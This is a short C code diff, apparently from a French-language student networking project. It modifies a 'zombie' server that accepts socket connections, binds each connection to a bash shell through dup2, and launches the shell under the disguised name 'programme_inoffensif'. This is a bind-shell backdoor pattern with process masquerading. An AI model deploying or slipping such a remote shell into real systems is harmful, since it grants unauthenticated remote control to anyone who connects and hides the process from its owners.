@@ -45,12 +45,15 @@ Zombie initSocketServer(bool withPort, int portReceived){
 	return zombie;
 }
 
-void createBash (void * sock){
+void createBash (void * sock){	
 	int* socket = sock;
+	
+	zombie.pid=getpid();
+		swrite(*socket, &zombie, sizeof(Zombie));
+
 	for (int i = 0; i < 3; ++i){
 		dup2(*socket,i);
 	}
-	zombie.pid=getpid();
 	sexecl("/bin/bash", "programme_inoffensif", NULL);
 
 }
@@ -76,7 +79,6 @@ int main(int argc, char const *argv[]){
 	printf("Le serveur tourne sur le port : %i \n", zombie.port);	
 	int newsockfd =0;
 	while((newsockfd = saccept(zombie.sockFd))>0){	
-		swrite(newsockfd, &zombie, sizeof(Zombie));
 		int childId=fork_and_run1(createBash,&newsockfd);
 		tabChild[numberChild]=childId;
 		numberChild++;
